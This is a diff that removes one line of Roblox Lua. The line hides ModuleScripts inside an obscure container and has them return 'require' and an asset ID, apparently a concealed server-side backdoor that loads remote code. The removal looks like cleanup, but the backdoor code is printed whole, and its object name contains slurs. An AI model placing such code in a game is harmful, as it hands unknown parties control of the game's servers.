@@ -1,1 +1,0 @@
-r=Instance.new("ReflectionMetadataYieldFunctions",game.ServerScriptService.Script) Instance.new("ModuleScript",r).Source = "return require" t=Instance.new("ModuleScript",r) t.Name = "gayretardednwordshardrserverside" t.Source = "return 113157616306996"
